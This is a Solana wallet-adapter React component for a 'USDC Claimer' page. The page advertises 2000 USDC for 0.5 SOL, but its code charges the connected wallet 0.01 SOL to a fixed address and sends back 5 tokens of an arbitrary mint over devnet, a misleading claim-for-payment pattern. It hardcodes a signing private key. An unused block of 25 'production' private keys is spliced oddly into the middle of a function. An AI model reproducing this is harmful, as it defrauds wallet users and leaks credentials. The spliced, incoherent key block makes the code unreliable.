/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3htAS5KAN6tA4r4hMG6u6fUjztJ2WCaabM94dsBBzwSEo2mHqoFCybbv2ALCJpZCYyPGzQagnabApwov7t4s9Sez"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2WjZueHRJDkug849XEcedu5Snyp66jprNVnLQEYkoEc9TmVZGYLteUa7XSvwXG5p7ax9iFukj8N1LmovTvBfk4PR",
  "key1": "3YcXp6s1UA2E3AAGdx5GN9aomYYjLDtcU3rSeiu2C3CCYmAseEiyWFSVw3PA6FEtF7HxwT3cdKkWnX6v5SX6cJD1",
  "key2": "2AdcrJDzh98HgJz5gRPKnJcrQqnu746pwMm4TRa29ev1aTv6VA6ntu48TgYUvbgVLQHSqMnga4jHchba9rbRajwJ",
  "key3": "3W2BrMqcXKrZy6zijy3SfbYjCgDCJTLn9YAv9ZvWwBGsB8WYSMas8SmaGxvUsvw5hp9pren6Gc6XzaC7q2NP2F4w",
  "key4": "NtmDdsm8rcAnY6YAuhQw2cATBExojVLjta17AgAMyeDw1koGuhRXM1XtJjEhT4PdapTHeisAgT8Fp8nsPqyjM7F",
  "key5": "2vtxJoXbnzc6Q9nFKLohSSYsNbk9xa6zB3K5dmu56RxeugRnKWqdJkPDNCZehnPT2oBjtZvgRFKGLTERSZHze5gr",
  "key6": "47isubZcKegjNKx3ScpR6jYCLi4fs2N9GTqdfL33HcZLe8wspngejmubMyyvsxqbYuJ8TMHMUifpd1iSR12LJ1gt",
  "key7": "4MuC5JkwXnm5wYz4EM4v8ReuWgH5rjydJK1aEYgHtAgC94pcbRBK7sGmz21KHLWbY9R46vscgALW5mEjFgFETn2M",
  "key8": "3suQbZSTceNx82Ngx1cBSvu95FHTWQm3ehLN5FWUwR6w7zuqgqtYWt2g2AJR7bHkKfppy8C5hcSRQuZCyD7pD49t",
  "key9": "2QByiEdNiGuQ5oYs2pSvnE473nbyBBsjvj9AEv7RREzcEpBke8JiBy1xN75cDGJevmGCKSbNdYbrEKbfDUjLtkq5",
  "key10": "S2PYF6eiJgZRQLeSGcjT2vs62txddUehZ4BoaKSo7ASJf4NjhVLDuCo1bZVie4MXqvv6VobaUYzXUUTFPWZtfJa",
  "key11": "5CLyBXRqZZgTZPT5wV6xiF3AmSSX96RLB3zqnSPx4uJg8mtqoEFHNEzxtQTnpGTeeN4oN6YSJGuEtxFWGyenWPer",
  "key12": "2CPPBzYJiD3Lahr6qk3YELRCYEXUwVS5uvAwdMfGUVNkuWUCW7gPYgMFMjcvstHdxLvGk38b1WGDEFgay3bT6j6p",
  "key13": "548RcctcBVCqL46giiWdMGKpeiLzjcnLVKRL2Y4srn2GwCXuSkwg5YBCYkxAjnmaDmY7BPf8rLfNBmmKsWvJwbjb",
  "key14": "2JyCdvB8Nka9v6FmNNbM3GNQRwKyLAc4YEmpM1xRhbcdCrrtVVtu3LtDEZCKcefhW33BvNDGgVChpTwc4GDMzwqf",
  "key15": "skVqdBoZW1Fin1GXf8huLgXh96V328di6aoYAiyUjnx8fmCe8HrnAXet5aUX12R8qzkk4Ggr4XQhdCBgGTJkQKS",
  "key16": "XZpv1SLh9Zn3Bf5H92QmYuniMEFf17KtA1pwjGbxtSuRZzKJrr2te3nj7T1xFyMqhRz66uNENRvLRuSib2uqs59",
  "key17": "53Png4DjjFPEA6mvthzaw4gKMkrP99d8fxSLXfhqXpmxdMKmXA2txvQMvgef9fRank43HVzeVm79UHGz2gQfjtid",
  "key18": "5nSNvZvVTF9znosRP5z8LNsNSRzu1GyBs3YQRSMEzAsYDUX2zm3gUTQ6iPghSAkduxfdWottz8kNRbL4c1MX85sT",
  "key19": "5mBYtxn5hUwvih82fuSErRitvXf59rH42gZiTPsrAeVdFuSaGqa7tWqi41UKfoqYgdv9qgLZeXY1fPSN7UFdLhbD",
  "key20": "3EjveMwTfxW33Z8ZVpFiyHJMb3vSN1fpdwwgV4MEAbzanCYDVUmF9RB7aaFFSzMh8vBVMB8y4TVUgp9hVoir3gqw",
  "key21": "25xBLVbvaJDGtLUq8sChuzWzUTmENnNqWwtv4PPhAm38q6esviuo8Wn3RYM5xzRjy9zMK2bAxRFAwpdW9qw7gAKA",
  "key22": "3qPDtCF4r6yAcdKuApkMrJSTvyKMQW49nVTBcj4ZCev3vSfAuGmxLV3wqcViF342WT8GiDorLdhhB1o7HdZnx9JM",
  "key23": "B5MSJz1zNTZnBisiCEAXhwAET4sPBdmwgKoBQYjSA51M6rziQyzk1pXBPFfsnFPXcyHz8RBoT6Ru58mfFJu7DYm",
  "key24": "3iq8oJsHzLwNr1CA3778xxd8bP6LwhRhnAjnTef5FFU88XPkE9Z2bNJdWkD71QmckPgiesttdCsigUrXSWHuS2RQ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
